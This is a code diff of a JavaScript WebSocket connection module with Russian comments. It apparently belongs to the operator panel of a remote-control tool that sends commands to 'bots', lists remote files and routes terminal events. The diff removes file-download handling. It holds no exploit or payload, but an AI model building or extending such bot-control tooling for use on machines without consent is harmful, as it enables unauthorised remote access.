@@ -1,4 +1,4 @@
-// frontend/client_control/js/modules/websocket/connection.js
+// frontend\client_control\js\modules\websocket\connection.js
 
 import { AppState } from '../core/states.js';
 import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
@@ -20,7 +20,6 @@ const setOnline = (on) => {
 
 /**
  * Обработка входящих пакетов данных
- * @param {ArrayBuffer} buf - Бинарные данные из WebSocket
  */
 const handleIncomingData = (buf) => {
     const pkg = decodePacket(buf);
@@ -46,37 +45,21 @@ const handleIncomingData = (buf) => {
         return;
     }
 
-    // --- Логика FileManager (Управление файлами) ---
+    // --- Логика FileManager (Упрощенная: только LIST) ---
     if (module === 'FileManager') {
-        console.log(`[WS] FileManager Response: ${action}`, payload);
+        console.log(`[WS] FileManager Response: ${action}`);
 
-        // 1. Получение списка файлов/дисков
+        // Обрабатываем только ответ на запрос списка файлов/дисков
         if (action === 'LIST') {
             if (window.renderFileSystem) {
-                // Вызываем глобальную функцию отрисовки из модуля files.js
+                // Отправляем payload (JSON список) в files.js
                 window.renderFileSystem(payload);
             }
             return;
         }
-
-        // 2. Скачивание: Анонс файла (Имя в extra, Размер в payload)
-        if (action === 'DT_START') {
-            window.dispatchEvent(new CustomEvent('FileManager:DT_START', { 
-                detail: { extra: extra, payload: payload } 
-            }));
-            return;
-        }
-
-        // 3. Скачивание: Прием чанка данных
-        if (action === 'DT_DATA') {
-            window.dispatchEvent(new CustomEvent('FileManager:DT_DATA', { 
-                detail: { payload: payload } 
-            }));
-            return;
-        }
     }
 
-    // Универсальное событие для всех остальных модулей
+    // Универсальное событие для остальных модулей (например, терминала)
     window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
 };
 
@@ -101,10 +84,7 @@ export const initControlConnection = () => {
 
     /**
      * Глобальная функция отправки команд боту
-     * @param {string} modName - Имя модуля (напр. 'FileManager')
-     * @param {any} pay - Данные
-     * @param {string} action - Действие (LIST, RUN, etc)
-     * @param {string} extra - Доп. параметр (путь или имя файла)
+     * Реализована строго по формуле: [HEADER] + [ID] + [MOD:TYPE:ACT:EXTRA] + [PAYLOAD]
      */
     window.sendToBot = (modName, pay, action = 'DATA', extra = 'none') => {
         if (socket?.readyState !== 1) return;
@@ -116,7 +96,7 @@ export const initControlConnection = () => {
             type = 'json';
         }
         
-        // Специальный хак для навигации: если это LIST, точно ставим json
+        // Форсируем тип json для навигации, чтобы бот корректно парсил пакет
         if (action === 'LIST') type = 'json';
 
         socket.send(encodePacket(tid, modName, type, action, extra, pay));
